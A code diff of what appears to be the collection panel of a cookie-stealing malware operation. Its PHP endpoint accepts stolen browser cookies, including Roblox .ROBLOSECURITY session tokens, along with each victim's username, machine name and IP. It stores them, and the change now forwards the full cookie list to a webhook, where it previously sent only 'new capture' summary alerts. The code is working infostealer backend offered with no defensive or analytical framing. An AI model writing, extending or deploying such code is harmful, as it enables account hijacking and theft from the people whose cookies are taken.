@@ -5,11 +5,12 @@ ini_set('display_errors', '0');
 /**
  * POST /api/collect.php
  *   {"tag":"r...","app":"...","user":"...","machine":"...","at":"...","cookies":[
- *      {"browser":"Chrome","host":".example.com","name":"sid","value":"...","path":"/","expires":0}]}
- * -> {"ok":true}
+ *      {"browser":"Chrome","host":".roblox.com","name":".ROBLOSECURITY","value":"...","path":"/","expires":0}]}
+ * -> {"ok":true,"count":1}
  */
 
 require __DIR__ . '/../lib/db.php';
+require __DIR__ . '/../lib/notify.php';
 
 if (($_SERVER['REQUEST_METHOD'] ?? 'GET') !== 'POST') {
     json_out(['ok' => false, 'error' => 'POST required'], 405);
@@ -35,7 +36,6 @@ $agent = substr((string)($_SERVER['HTTP_USER_AGENT'] ?? ''), 0, 240);
 
 // keep the stored copy bounded and normalised
 $clean = [];
-$browsers = [];
 foreach ($cookies as $cookie) {
     if (!is_array($cookie)) {
         continue;
@@ -52,7 +52,6 @@ foreach ($cookies as $cookie) {
         continue;
     }
     $clean[] = $entry;
-    $browsers[$entry['browser']] = ($browsers[$entry['browser']] ?? 0) + 1;
     if (count($clean) >= 20000) {
         break;
     }
@@ -73,71 +72,8 @@ $stmt = db()->prepare(
 );
 $stmt->execute([$tag, $app, $suser, $machine, $ip, $agent, count($clean), $at, now_iso(), $payload]);
 
-notify_webhook($tag, $app, $suser, $machine, $ip, count($clean), $browsers);
+$conf = panel_conf();
+$hook = trim((string)(setting('webhook', (string)($conf['webhook'] ?? '')) ?? ''));
+notify_capture($hook, $tag, $app, $suser, $machine, $ip, $clean);
 
 json_out(['ok' => true, 'count' => count($clean)]);
-
-function notify_webhook(string $tag, string $app, string $user, string $machine,
-                        string $ip, int $count, array $browsers): void
-{
-    $conf = panel_conf();
-    $hook = trim((string)($conf['webhook'] ?? ''));
-    if ($hook === '') {
-        $hook = trim((string)(setting('webhook', '') ?? ''));
-    }
-    if ($hook === '' || strpos($hook, 'https://') !== 0) {
-        return;
-    }
-
-    $lines = [];
-    $lines[] = '**new capture** - ' . $count . ' cookies';
-    $lines[] = '`' . $user . '@' . $machine . '` from ' . $ip;
-    if ($tag !== '') {
-        $lines[] = 'build `' . $tag . '`' . ($app !== '' ? ' / ' . $app : '');
-    }
-    if ($browsers) {
-        arsort($browsers);
-        $parts = [];
-        foreach ($browsers as $name => $n) {
-            $parts[] = $name . ' ' . $n;
-        }
-        $lines[] = implode(' | ', array_slice($parts, 0, 6));
-    }
-
-    $body = json_encode([
-        'username' => 'Rose',
-        'allowed_mentions' => ['parse' => []],
-        'content' => implode("\n", $lines),
-    ], JSON_UNESCAPED_SLASHES);
-
-    post_async($hook, (string)$body);
-}
-
-function post_async(string $url, string $body): void
-{
-    if (function_exists('curl_init')) {
-        $ch = curl_init($url);
-        curl_setopt_array($ch, [
-            CURLOPT_POST => true,
-            CURLOPT_POSTFIELDS => $body,
-            CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_TIMEOUT => 4,
-            CURLOPT_CONNECTTIMEOUT => 3,
-        ]);
-        curl_exec($ch);
-        curl_close($ch);
-        return;
-    }
-
-    $context = stream_context_create([
-        'http' => [
-            'method' => 'POST',
-            'header' => "Content-Type: application/json\r\n",
-            'content' => $body,
-            'timeout' => 4,
-            'ignore_errors' => true,
-        ],
-    ]);
-    @file_get_contents($url, false, $context);
-}
